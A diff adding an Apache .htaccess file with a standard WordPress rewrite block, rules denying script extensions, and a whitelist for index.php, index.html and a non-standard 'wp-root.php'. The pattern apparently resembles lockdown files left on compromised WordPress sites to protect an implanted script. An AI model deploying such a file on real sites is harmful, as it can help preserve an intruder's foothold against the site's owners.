@@ -1,0 +1,31 @@
+<IfModule mod_rewrite.c>
+
+RewriteEngine On
+
+RewriteBase /
+
+RewriteRule ^index.php$ - [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule . index.php [L]
+
+</IfModule>
+
+<FilesMatch ".(py|exe|phtml|ph|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|php6)$">
+
+Order Allow,Deny
+
+Deny from all
+
+</FilesMatch>
+
+<FilesMatch "^(index.php|index.html|wp-root.php)$">
+
+Order Allow,Deny
+
+Allow from all
+
+</FilesMatch>
